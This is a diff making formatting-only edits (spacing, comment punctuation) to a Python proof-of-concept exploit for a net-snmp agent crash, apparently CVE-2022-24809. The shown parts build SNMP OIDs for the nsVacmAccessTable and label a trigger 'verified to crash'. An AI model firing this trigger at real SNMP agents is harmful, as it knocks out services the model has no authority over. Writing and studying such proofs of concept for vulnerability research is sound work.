@@ -10,6 +10,7 @@ the agent dereferences it -> SIGSEGV (caught by ASan when built with it).
 Self-contained: includes a minimal BER encoder, no pysnmp required.
 Usage: poc_2022_24809.py [host] [port]   (default 127.0.0.1 16166)
 """
+
 import socket
 import sys
 import time
@@ -46,7 +47,7 @@ def enc_int(n: int) -> bytes:
 
 def enc_oid(parts) -> bytes:
     if len(parts) < 2:
-        # truly degenerate OID (single arc) — encode raw
+        # truly degenerate OID (single arc) - encode raw
         body = bytes(parts)
         return tlv(0x06, body)
     body = bytes([parts[0] * 40 + parts[1]])
@@ -113,17 +114,17 @@ def main():
     base = [1, 3, 6, 1, 4, 1, 8072, 1, 9, 1]  # nsVacmAccessTable
     # Columns (nsVacmAccessEntry .1 then column number):
     #   col 2 = nsVacmContextMatch, 3 = nsVacmViewName, 4 = storageType, 5 = status
-    col_ctx = base + [1, 2]   # COLUMN_NSVACMCONTEXTMATCH (the MODE_GET branch)
+    col_ctx = base + [1, 2]  # COLUMN_NSVACMCONTEXTMATCH (the MODE_GET branch)
 
     # A real, fully-indexed instance OID looks like (numeric):
     #   <col>.8.g.r.p.c.o.m.m.1 . 0 . 0 . 1 . 4.r.e.a.d
     #   i.e. vacmGroupName(len8 "grpcomm1") . ctxPrefix(len0) . secModel(0)
     #        . secLevel(1) . nsVacmAuthType(len4 "read")
-    grp = [8, 103, 114, 112, 99, 111, 109, 109, 49]      # "grpcomm1"
-    ctxpfx = [0]                                          # zero-length string
+    grp = [8, 103, 114, 112, 99, 111, 109, 109, 49]  # "grpcomm1"
+    ctxpfx = [0]  # zero-length string
     secmodel = [0]
     seclevel = [1]
-    authtype = [4, 114, 101, 97, 100]                    # "read"
+    authtype = [4, 114, 101, 97, 100]  # "read"
     full_idx = grp + ctxpfx + secmodel + seclevel + authtype
 
     # ---- PRIMARY trigger (verified to crash) -----------------------------
